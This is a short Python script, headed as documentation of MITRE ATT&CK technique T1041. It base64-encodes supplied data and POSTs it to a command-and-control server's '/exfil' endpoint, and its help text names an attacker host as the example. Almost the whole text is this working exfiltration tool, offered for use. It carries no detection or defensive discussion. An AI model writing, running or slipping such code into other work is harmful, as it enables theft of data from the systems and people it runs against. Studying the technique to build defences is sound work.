# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1041: Exfiltration Over Command and Control Channel
# Objective: Using C2 protocols (e.g., HTTP, DNS) to exfiltrate data.

#!/usr/bin/env python3
import requests
import argparse
import base64

def exfiltrate_via_http(data, c2_server):
    encoded_data = base64.b64encode(data.encode()).decode()
    try:
        response = requests.post(f"{c2_server}/exfil", data={"data": encoded_data})
        if response.status_code == 200:
            print("[+] Data exfiltrated successfully via HTTP.")
        else:
            print(f"[-] Failed to exfiltrate data. Status: {response.status_code}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="T1041: Exfiltrate data via HTTP C2")
    parser.add_argument("--data", required=True, help="Data to exfiltrate")
    parser.add_argument("--c2", required=True, help="C2 server URL (e.g., http://attacker.com)")
    args = parser.parse_args()
    exfiltrate_via_http(args.data, args.c2)